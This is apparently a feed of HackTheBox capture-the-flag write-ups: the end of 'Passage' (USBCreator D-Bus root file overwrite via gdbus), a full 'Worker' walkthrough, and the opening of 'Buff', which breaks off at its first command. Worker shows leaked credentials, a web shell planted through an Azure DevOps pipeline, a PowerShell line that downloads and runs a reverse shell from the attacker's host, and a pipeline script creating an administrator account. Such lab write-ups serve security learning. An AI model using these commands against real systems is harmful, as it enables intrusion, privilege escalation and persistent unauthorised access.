<p>There is a research about a vulnerability in USBCreator D-Bus Interface, which can be used for local privilege escalation<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>. The research summary as follows:</p>
<p>&ldquo;<em>A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root - without supplying a password. This trivially leads to elevated privileges, for instance, by overwriting the shadow file and setting a password for root. The issue was resolved in June when Ubuntu <a href="https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1832337">patched</a> the relevant packages in response to a vulnerability disclosure from Unit 42.</em>&rdquo;</p>
<p>The bug was first reported in 2016<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>, and the affected Ubuntu version is 16.04.</p>
<p><div class="img-container"><img src="imgs/image-20210508150754640.png" alt="image-20210508150754640"  /></div>
</p>
<p>The current machine is not an exact match, but since the vulnerability is patched in 2019, it may affect this version too.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nadav@passage:~$ uname -a
Linux passage 4.15.0-45-generic <span style="color:#75715e">#48~16.04.1-Ubuntu SMP Sun Sep 6 14:31:10 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre></div><h4 id="overwrite-authorized_keys">Overwrite authorized_keys</h4>
<p>One of the tools used by the researcher to exploit the vulnerability is a CLI-based called <code>gdbus</code>.</p>
<p>With user <code>nadav</code>, I can try to overwrite the authorized_keys file contents in the root directory with my public key.</p>
<p>I&rsquo;ll put my public key named <code>key</code> in <code>/dev/shm/</code>, and then I&rsquo;ll  invoke the following command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /dev/shm/key /root/.ssh/authorized_keys true
true
<span style="color:#f92672">()</span>
</code></pre></div><p>I tried to login as root using my private key, and it worked.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «passage» «10.10.14.31»
$ ssh -i root_rsa root@10.10.10.206
Last login: Fri Mar  5 17:33:39 2020 from 10.10.14.7
root@passage:~# ls -l
total 12
drwxr-xr-x 2 root root 4096 Jul 21  2020 exploits
drwxr-xr-x 2 root root 4096 Jul 21  2020 exploits
-r-------- 1 root root   33 Mar  5 17:05 root.txt
root@passage:~# 
</code></pre></div><section class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p><a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p><a href="https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1568149">https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1568149</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</section>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Worker</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-worker/</link>
      <pubDate>Mon, 03 May 2021 17:01:02 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-worker/</guid>
      <description>Worker is a medium difficulty Windows machine that features a self-hosted Apache Subversion and Azure DevOps server. Enumerating the Subversion server discovers a set of credentials and a subdomain at which the Azure DevOps is hosted. The credentials can be used to login into Azure DevOps server, which then leveraged to gain a foothold on the box by dropping a web shell. Enumeration inside the box finds another set of credentials that also can be used to login into the Azure DevOps.</description>
      <content:encoded><![CDATA[<p>Worker is a medium difficulty Windows machine that features a self-hosted Apache Subversion and Azure DevOps server. Enumerating the Subversion server discovers a set of credentials and a subdomain at which the Azure DevOps is hosted. The credentials can be used to login into Azure DevOps server, which then leveraged to gain a foothold on the box by dropping a web shell. Enumeration inside the box finds another set of credentials that also can be used to login into the Azure DevOps. Using the second credentials I obtained, I&rsquo;m able to gain administrator access by exploiting Azure Pipeline.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>SVN enumeration</li>
<li>Windows enumeration</li>
<li>Exploiting Azure Pipelines</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>svn cli client - Preinstalled in Kali Linux</li>
<li>Evil-WinRM - <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial TCP scan with <code>nmap</code> discovers two open ports: 80 (HTTP) and 3690 (Subversion)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «10.10.14.19» 
$ nmap -sC -sV -oN worker-initial -v 10.10.10.203
<span style="color:#75715e"># Nmap 7.80 scan initiated Sun Aug 16 11:35:56 2020 as: nmap -sC -sV -oN worker-initial -v 10.10.10.203</span>
Nmap scan report <span style="color:#66d9ef">for</span> dimension.worker.htb <span style="color:#f92672">(</span>10.10.10.203<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
3690/tcp open  svnserve Subversion
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</code></pre></div><p>Performing another scan on typical Active Directory DC ports shows only WinRM (5985) is open.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «10.10.14.19»
$ nmap -p53,445,389,5985 10.10.10.203
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-01-31 13:34 EST
Host is up <span style="color:#f92672">(</span>0.013s latency<span style="color:#f92672">)</span>.

PORT     STATE     SERVICE
<span style="color:#ae81ff">53</span>       filtered  domain
<span style="color:#ae81ff">389</span>      filtered  ldap
<span style="color:#ae81ff">445</span>      filtered  microsoft-ds
<span style="color:#ae81ff">5985</span>     open      wsman
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting the port 80 displays the IIS default page.</p>
<p><div class="img-container"><img src="imgs/image-20210503174900610.png" alt="image-20210503174900610"  /></div>
</p>
<h3 id="tcp-3690---subversionsvn">TCP 3690 - Subversion/SVN</h3>
<p>This is my first encounter with Subversion, it is a software for version control that is similar to git. To interact with this service, I&rsquo;ll need the Subversion client. Fortunately, it was preinstalled in Kali Linux.</p>
<p>The general usage as follows:</p>
<pre><code>svn &lt;sub-command&gt; svn://[ip]
</code></pre><ul>
<li>Example of subcommand: <code>ls</code>, <code>cat</code>, <code>info</code>, <code>log</code>.</li>
</ul>
<p>With the subcommand <code>ls</code>, I can list the repository contents.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
$ svn ls svn://10.10.10.203
dimension.worker.htb/
moved.txt
</code></pre></div><p><code>moved.txt</code> tells that the repository is no longer maintained. The latest repo is available at <code>http://devops.worker.htb</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
$ svn cat svn://10.10.10.203/moved.txt
This repository has been migrated and will no longer be maintaned here.
You can find the latest version at: http://devops.worker.htb

// The Worker team :<span style="color:#f92672">)</span>
</code></pre></div><p>With the subcommand <code>info</code>, I find the author of the repository. It also reveals that the repository has 5 revisions (commit).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
$ svn info svn://10.10.10.203
Path: .
URL: svn://10.10.10.203
Relative URL: ^/
Repository Root: svn://10.10.10.203
Repository UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1
Revision: <span style="color:#ae81ff">5</span>
Node Kind: directory
Last Changed Author: nathen
Last Changed Rev: <span style="color:#ae81ff">5</span>
Last Changed Date: 2020-06-20 09:52:00 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span>
</code></pre></div><p>I can check the revision log using the sub command <code>log</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
$ svn log svn://10.10.10.203
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r5 | nathen | 2020–06–20 09:52:00 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
Added note that repo has been migrated
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r4 | nathen | 2020–06–20 09:50:20 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
Moving this repo to our new devops server which will handle the deployment <span style="color:#66d9ef">for</span> us
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r3 | nathen | 2020–06–20 09:46:19 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
-
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r2 | nathen | 2020–06–20 09:45:16 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
Added deployment script
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r1 | nathen | 2020–06–20 09:43:43 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
First version
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
</code></pre></div><p>The commit message on <code>r2</code> seems interesting.</p>
<p>I can check the differences between <code>r1</code> and <code>r2</code> using the subcommand <code>diff</code>. The output shows there is a hard-coded credentials.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
$ svn diff -r 1:2 svn://10.10.10.203/
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210503175056134.png" alt="image-20210503175056134"  /></div>
</p>
<p>From here, I&rsquo;ll take note about what I&rsquo;ve found here.</p>
<ul>
<li>Two subdomains: <code>dimension.worker.htb</code> and <code>devops.worker.htb</code></li>
<li>A set of credentials: <code>nathen:wendel98</code></li>
</ul>
<p>I&rsquo;ll add those two subdomains to my <code>/etc/hosts</code> file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">10.10.10.203 dimension.worker.htb devops.worker.htb
</code></pre></div><p>Then after I make sure there is nothing left, I&rsquo;ll revisit port 80 with the newly discovered subdomain.</p>
<h3 id="tcp-80---dimensionworkerhtb">TCP 80 - dimension.worker.htb</h3>
<p>Visiting <code>dimension.worker.htb</code> presented with a static page.</p>
<p><div class="img-container"><img src="imgs/image-20210503175111010.png" alt="image-20210503175111010"  /></div>
</p>
<p>It even leads to others static site (with subdomain) which I think they are just decoy.</p>
<p><div class="img-container"><img src="imgs/image-20210503175127918.png" alt="image-20210503175127918"  /></div>
</p>
<p>Before moving on, I&rsquo;ll add all the subdomains I found on <code>/#work</code> to my <code>/etc/hosts</code>. They are:</p>
<ul>
<li><code>alpha.worker.htb</code></li>
<li><code>cartoon.worker.htb</code></li>
<li><code>lens.worker.htb</code></li>
<li><code>solid-state.worker.htb</code></li>
<li><code>spectral.worker.htb</code></li>
<li><code>story.worker.htb</code></li>
</ul>
<p>Now I&rsquo;ll jump over to the mentioned new DevOps server at <code>http://devops.worker.htb</code>.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-iis-appool">Shell as IIS appool</h3>
<h4 id="azure-devops---smarthotel360">Azure DevOps - SmartHotel360</h4>
<p>Visiting <code>http://devops.worker.htb</code> pops an authentication prompt. It logs me in after I entered the credentials I obtained from SVN, and the user, <code>nathen</code>, is currently working on a project called &ldquo;SmartHotel360&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210503175154637.png" alt="image-20210503175154637"  /></div>
</p>
<p>My first objective is to find out what permission do this user have. I clicked the project and try to lookup into the Project Settings.</p>
<p><div class="img-container"><img src="imgs/image-20210503175211414.png" alt="image-20210503175211414"  /></div>
</p>
<p>User permission or group related settings are found to be under the Security menu (Project Settings -&gt; Security Settings).</p>
<p>It seems user <code>nathen</code> is the only member of the SmartHotel360 Team.</p>
<p><div class="img-container"><img src="imgs/image-20210503175233456.png" alt="image-20210503175233456"  /></div>
</p>
<p>And the SmartHotel360 team is a member of Contributors group and Projects Valid Users, and this is added by default upon creating a team group.</p>
<p><div class="img-container"><img src="imgs/image-20210503175249455.png" alt="image-20210503175249455"  /></div>
</p>
<p>The Contributors group and Projects Valid Users group permissions are defined <a href="https://docs.microsoft.com/en-us/azure/devops/organizations/security/permissions?view=azure-devops&amp;tabs=preview-page">here</a>, and user <code>nathen</code> inherits those two groups' permission.</p>
<p><div class="img-container"><img src="imgs/image-20210503230648404.png" alt="image-20210503230648404"  /></div>
</p>
<p>From there, I try to lookup into the project&rsquo;s repository.</p>
<p>I find a bunch of website repositories on the Repos menu. These repositories are previously listed on <code>http://dimension.worker.htb/#work</code> page. User <code>nathen</code> is the author of these repositories.</p>
<p><div class="img-container"><img src="imgs/image-20210503175346216.png" alt="image-20210503175346216"  /></div>
</p>
<p>On the Pipelines menu, there are Azure Pipelines for some of the sites. Azure Pipelines is CICD feature from Azure DevOps. It is similar to GitHub Action that I use to rebuild this static site using Hugo when there is a new commit pushed into the main/master branch.</p>
<blockquote>
<p>My video recommendation about CICD: <a href="https://www.youtube.com/watch?v=scEDHsr3APg">https://www.youtube.com/watch?v=scEDHsr3APg</a></p>
</blockquote>
<p><div class="img-container"><img src="imgs/image-20210503175356998.png" alt="image-20210503175356998"  /></div>
</p>
<p>User <code>nathen</code> is allowed to queue a builds.</p>
<p><div class="img-container"><img src="imgs/image-20210503175409857.png" alt="image-20210503175409857"  /></div>
</p>
<p>With all of these permission, I can make changes such as dropping a web shell to one of the site repositories that has its own pipeline, say the alpha repository which has Alpha-CI, then I can queue those changes to the pipelines and wait until the site re-deployed/hosted. From there, I should be able to access my web-shell.</p>
<h4 id="webshell-upload">Webshell Upload</h4>
<p>On my first attempt, it tells me to use pull requests instead of uploading a file directly to the master branch.</p>
<p>So, I&rsquo;ll upload my web shell which is <code>cmdasp.aspx</code> (because the web server is IIS) on a new branch. I’ll be using the alpha repository.</p>
<p><div class="img-container"><img src="imgs/image-20210503175435088.png" alt="image-20210503175435088"  /></div>
</p>
<p>I&rsquo;ll pick any available work items.</p>
<p><div class="img-container"><img src="imgs/image-20210503175452577.png" alt="image-20210503175452577"  /></div>
</p>
<p>I can just drag and drop the web shell, and commit it afterwards.</p>
<p><div class="img-container"><img src="imgs/image-20210503175506892.png" alt="image-20210503175506892"  /></div>
</p>
<p>From here, I can create a pull request to the master branch to trigger the pipelines or run the Alpha-CI build manually.</p>
<p>If I choose a pull request, it needs to be reviewed first and the reviewer is the user <code>nathen</code> itself, it can decide whether to approve or reject the pull request (well, actually it was me who decide it). It then queue the build.</p>
<p><div class="img-container"><img src="imgs/image-20210503175518917.png" alt="image-20210503175518917"  /></div>
</p>
<p>The other options is with this queue builds. I can skip the review and run the queue builds for my branch (on the image it is shell branch instead of iamf).</p>
<p><div class="img-container"><img src="imgs/image-20210503175531792.png" alt="image-20210503175531792"  /></div>
</p>
<p>After the build finished, I can see my web shell is available at <code>alpha.worker.htb/cmdasp.aspx</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210503175541314.png" alt="image-20210503175541314"  /></div>
</p>
<p>To gain an interactive shell, I&rsquo;ll setup a <code>netcat</code> listener on my Kali, then I&rsquo;ll upload a <a href="https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3">PowerShell reverse shell</a> called <code>itsf.ps1</code> and execute it via the web shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">powershell.exe <span style="color:#e6db74">&#34;mkdir c:/temp;invoke-webrequest -uri 10.10.14.19/itsf.ps1 -outfile C:\temp\itsf.ps1;C:\temp\itsf.ps1&#34;</span>
</code></pre></div><p>I have a shell now on my listener.</p>
<p><div class="img-container"><img src="imgs/image-20210503175604917.png" alt="image-20210503175604917"  /></div>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-robisl">Shell as robisl</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>Enumerating the user groups and privileges using the <code>whoami /all</code> command reveals that IIS appool has <code>SeImpersonatePrivilege</code> which according to <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">BookHackTrick</a>, it can be abused using RogueWinRM.</p>
<p><div class="img-container"><img src="imgs/image-20210503175615273.png" alt="image-20210503175615273"  /></div>
</p>
<p>Unfortunately, the WinRM port was already open, I couldn’t exploit it with RogueWinRM. But, I managed to find another way!</p>
<p>Enumerating the Users folder finds two users, <code>robisl</code> and <code>restorer</code> (as the name implies, it restore the box configuration, I&rsquo;ll ignore this).</p>
<p><div class="img-container"><img src="imgs/image-20210503175630874.png" alt="image-20210503175630874"  /></div>
</p>
<p>By using the <code>net</code> command, it shows that <code>robisl</code> can login remotely.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PS C:\Users&gt; net user robisl
User name                    robisl
Full Name                    Robin Islip
Comment                      
User’s comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2020-04-05 21:27:26
Password expires             Never
Password changeable          2020-04-05 21:27:26
Password required            No
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2020-08-18 18:28:36

Logon hours allowed          All

Local Group Memberships      *Production           *Remote 
Global Group memberships     *None                 
The command completed successfully.
</code></pre></div><p>With <code>net</code> command, I also find there is another drive mounted as <code>W:\</code></p>
<pre><code>PS C:\users\&gt;net share

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default share
IPC$                                         Remote IPC
W$           W:\                             Default share
ADMIN$       C:\Windows                      Remote Admin
The command completed successfully.
</code></pre><p>There are 4 folders in the <code>W:\</code> drive, the one that interesting is the svnrepos folder.</p>
<pre><code>PS W:\&gt; dir


    Directory: W:\


Mode                LastWriteTime         Length Name                                                             
----                -------------         ------ ----                                                             
d-----       2020-06-16     18:59                agents                                                          
d-----       2020-03-28     15:57                AzureDevOpsData                                                
d-----       2020-04-03     11:31                sites                                                          
d-----       2020-06-20     16:04                svnrepos
</code></pre><p>I can enumerate all folder and sub folder on the <code>W:\</code> drive recursively using the <code>dir</code> command. Because I&rsquo;m on PowerShell, I have to use <code>cmd /c &lt;command&gt;</code> keyword.</p>
<pre><code>PS W:\&gt; cmd.exe /c &quot;dir /s /b svnrepos&quot;
</code></pre><p>Well PowerShell can do that too, but I prefer <code>cmd</code>.</p>
<pre><code>PS W:\&gt; Get-ChildItem -Path W:\svnrepos -Filter * -Recurse -ErrorAction SilentlyContinue -Force
</code></pre><p>In the output, there is a <code>passwd</code> file that immediately draws my attention</p>
<p><div class="img-container"><img src="imgs/image-20210504232344047.png" alt="image-20210504232344047"  /></div>
</p>
<p>The <code>passwd</code> file contains a bunch of credentials, and my eyes caught the password for <code>robisl</code>.</p>
<pre><code>PS W:\svnrepos\&gt; gc .\www\conf\passwd
### This file is an example password file for svnserve.
### Its format is similar to that of svnserve.conf. As shown in the
### example below it contains one section labelled [users].
### The name and password for each user follow, one account per line.

[users]
nathen = wendel98
nichin = fqerfqerf
nichin = asifhiefh
noahip = player
nuahip = wkjdnw
oakhol = bxwdjhcue
owehol = supersecret
paihol = painfulcode
parhol = gitcommit
pathop = iliketomoveit
pauhor = nowayjose
payhos = icanjive
perhou = elvisisalive
peyhou = ineedvacation
phihou = pokemon
quehub = pickme
quihud = kindasecure
rachul = guesswho
raehun = idontknow
ramhun = thisis
ranhut = getting
rebhyd = rediculous
reeinc = iagree
reeing = tosomepoint
reiing = isthisenough
renipr = dummy
rhiire = users
riairv = canyou
ricisa = seewhich
robish = onesare
robisl = wolves11
robive = andwhich
ronkay = onesare
rubkei = the
rupkel = sheeps
ryakel = imtired
sabken = drjones
samken = aqua
sapket = hamburger
sarkil = friday
</code></pre><h4 id="remote-access---robisl">Remote Access - robisl</h4>
<p>I can login remotely using <code>robisl</code> credentials with <code>evil-winrm</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «10.10.14.19»
$ evil-winrm -i 10.10.10.203 -u robisl -p wolves11

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>obisl<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
worker<span style="color:#ae81ff">\r</span>obisl
*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>obisl<span style="color:#ae81ff">\D</span>ocuments&gt; cd ../Desktop
*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>obisl<span style="color:#ae81ff">\D</span>esktop&gt; dir


    Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>obisl<span style="color:#ae81ff">\D</span>esktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/29/2020   3:37 PM             <span style="color:#ae81ff">34</span> user.txt
</code></pre></div><h3 id="shell-as-administrator">Shell as administrator</h3>
<h4 id="azure-devops---partsunlimited">Azure DevOps - PartsUnlimited</h4>
<p>After enumerating many things in the remote shell and coming up empty-handed, I returned to Azure DevOps, but this time with a <code>robisl</code> account.</p>
<p><div class="img-container"><img src="imgs/image-20210503175744995.png" alt="image-20210503175744995"  /></div>
</p>
<p>Long short story, <code>robisl </code> is member of Build Administrator.</p>
<p><div class="img-container"><img src="imgs/image-20210503175756504.png" alt="image-20210503175756504"  /></div>
</p>
<p>The Build Administrators defined as follows [<a href="https://docs.microsoft.com/en-us/azure/devops/organizations/security/permissions?view=azure-devops&amp;tabs=preview-page">source</a>].</p>
<p><div class="img-container"><img src="imgs/image-20210504010111041.png" alt=""  /></div>
</p>
<h4 id="exploit-azure-pipelines---read-the-root-flag">Exploit Azure Pipelines - Read the Root Flag</h4>
<p>So the plan is, I’ll create an Azure pipelines with malicious deployment script/task to execute OS commands.</p>
<p><div class="img-container"><img src="imgs/image-20210503175809136.png" alt="image-20210503175809136"  /></div>
</p>
<p>If I lookup into the agent pool in the Project Settings menu, there is an available agent named ‘Setup’. The agent is owned by an Administrator account, and as a Build Administrator member (inherited), user <code>robisl</code> also has access to it.</p>
<p><div class="img-container"><img src="imgs/image-20210503175820811.png" alt="image-20210503175820811"  /></div>
</p>
<p>So, let’s execute the plan!</p>
<p>First, I’ll create a pipeline (Pipelines -&gt; Builds -&gt;  New Pipeline).</p>
<p><div class="img-container"><img src="imgs/image-20210503175837201.png" alt="image-20210503175837201"  /></div>
</p>
<p>In the next section, I’ll choose Azure Repos Git.</p>
<p><div class="img-container"><img src="imgs/image-20210503175848517.png" alt="image-20210503175848517"  /></div>
</p>
<p>On the next one, I’ll select &ldquo;PartsUnlimited&rdquo; as the repository, because that is the repo where <code>robisl</code> is working on.</p>
<p><div class="img-container"><img src="imgs/image-20210503175906165.png" alt="image-20210503175906165"  /></div>
</p>
<p>In the Configure section, scroll down and select the starter pipeline (I forgot the name, but don&rsquo;t choose the existing one). After that, I’ll modify the pool and the script in the &ldquo;Review&rdquo; section to steal the flag.</p>
<p><div class="img-container"><img src="imgs/image-20210503175920007.png" alt="image-20210503175920007"  /></div>
</p>
<p>The master branch will be the <code>trigger</code> to run the CI\CD (If I push a changes to the &ldquo;PartsUnlimited&rdquo; repository). Since I have access to the &ldquo;Setup&rdquo; pool, I&rsquo;ll use it as the <code>pool</code>. Lastly, on the <code>steps</code> you can add a task/script you want to run/do. In my case, I want to read the root flag.</p>
<p>I’ll save it and run it on a new branch.</p>
<p><div class="img-container"><img src="imgs/image-20210503175931307.png" alt="image-20210503175931307"  /></div>
</p>
<p>I’ll just wait for the output log.</p>
<p><div class="img-container"><img src="imgs/image-20210503175944023.png" alt="image-20210503175944023"  /></div>
</p>
<p>Once it completed, I can see the root flag inside the &ldquo;Steal the flag&rdquo; output</p>
<p><div class="img-container"><img src="imgs/image-20210503175957351.png" alt="image-20210503175957351"  /></div>
</p>
<h4 id="create-user-with-administrator-privileges">Create User with Administrator Privileges</h4>
<p>I can also create a privileged user using multi-line script.</p>
<pre><code>- script: | 
net user iamf YourComplexPassword /add /domain
net localgroup Administrators iamf /add 
net localgroup &quot;Remote Management Users&quot; iamf /add 
displayName: &quot;Set IamF to Admin&quot;
</code></pre><p>I can push it again and wait for it to complete.</p>
<p><div class="img-container"><img src="imgs/image-20210503180039057.png" alt="image-20210503180039057"  /></div>
</p>
<p>Now I can login with the newly created user.</p>
<p><div class="img-container"><img src="imgs/image-20210503180028754.png" alt="image-20210503180028754"  /></div>
</p>
<hr>
<p>References:</p>
<ul>
<li><a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops">https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops</a></li>
<li><a href="https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/">https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/</a></li>
<li><a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops&amp;tabs=yaml#ci-triggers">https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops&amp;tabs=yaml#ci-triggers</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Buff</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-buff/</link>
      <pubDate>Sat, 01 May 2021 16:30:16 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-buff/</guid>
      <description>Buff is a Windows machine with easy difficulty from HackTheBox that features an open source web application called &amp;ldquo;Gym Management System&amp;rdquo;. The application can be exploited using a publicly available exploit. Internal enumeration discovers a program service that is bound to the loopback interface. The program is found to be vulnerable to a buffer overflow attack, and there is also a publicly available exploit to exploit it to gain access as Administrator.</description>
      <content:encoded><![CDATA[<p>Buff is a Windows machine with easy difficulty  from HackTheBox that features an open source web application called &ldquo;Gym Management System&rdquo;. The application can be exploited using a publicly available exploit. Internal enumeration discovers a program service that is bound to the loopback interface. The program is found to be vulnerable to a buffer overflow attack, and there is also a publicly available exploit to exploit it to gain access as Administrator. Because it is bound to the loopback interface, hence a setup for port forwarding is required before sending the exploit.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Gym Management System 1.0 Exploitation</li>
<li>Port Forwarding</li>
<li>CloudMe 1.12 Exploitation</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>searchsploit/Exploit-DB - Preinstalled in Kali Linux</li>
<li>chisel - <a href="https://github.com/jpillora/chisel/releases">https://github.com/jpillora/chisel/releases</a></li>
<li>msfvenom - Preinstalled in Kali Linux</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial scan with <code>nmap</code> only discovers one port open on 8080 running an Apache web server.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «~» «10.10.14.18»
